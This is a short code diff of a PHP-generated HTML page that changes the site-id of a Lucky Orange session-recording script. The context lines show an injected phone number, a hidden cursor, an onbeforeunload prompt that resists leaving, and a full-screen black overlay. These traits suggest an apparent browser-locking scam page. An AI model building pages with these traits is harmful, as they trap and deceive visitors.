@@ -114,7 +114,7 @@ $codeString = '
          var phone_number = "' . $number . '";
          
       </script>
-     <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=2bc12fdd"></script>
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=42c623bb"></script>
    </head>
    <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
 <div id="floatbox" style="position: fixed;z-index: 999999999;height: 100vh;width: 100vw;background: black;" class="bxcontb">
